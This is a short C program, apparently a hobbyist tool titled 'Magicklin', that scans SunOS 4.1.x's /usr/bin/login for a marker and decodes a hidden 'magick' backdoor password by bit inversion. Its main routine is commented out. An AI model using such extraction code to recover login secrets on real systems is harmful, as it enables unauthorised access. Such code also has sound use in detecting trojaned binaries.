#include <stdio.h>
#include <ctype.h>
#include <string.h>

#define KEYWORD "(#)"
#define LOGIN_PATH "/usr/bin/login"
#define OK 1
#define NG 0

char mgkpass[0x0d];

int decode_mgkpw();

main()
{
    /*
    FILE *fp;
    int loop;

    // title :-) 
    printf("=== Magicklin ver 1.00  Produced by DEF-CON ZERO ===\n\n");
    //  file open   
    if (NULL == (fp = fopen(LOGIN_PATH, "r")))
    {
        perror("Can't open login file!?");
        exit(0);
    }
    // buffer zero clear   
    memset(mgkpass, '\0', 0x0d);
    // read file   
    for (;;)
    {
        mgkpass[0x0b] = fgetc(fp);
        if (feof(fp))
        {
            puts("This server isn't using SunOS4.1.x");
            exit(0);
        }
        if (strstr(mgkpass + 0x09, KEYWORD))
            break;
        for (loop = 0; loop < 0x0b; loop++)
            mgkpass[loop] = mgkpass[loop + 1];
    }
    // decode and check   
    decode_mgkpw() ? printf("Magick password is %s !!\n", mgkpass) : puts("Not found magick password to this server.");

    // complete   
    exit(1);
    */
}

/* magick password decode */
int decode_mgkpw()
{
    int loop;

    for (loop = 0; loop < 0x09; loop++)
        if (!isprint(mgkpass[loop] = ~mgkpass[loop]))
            break;
    mgkpass[loop] = '\0';
    return (strlen(mgkpass) ? OK : NG);
}
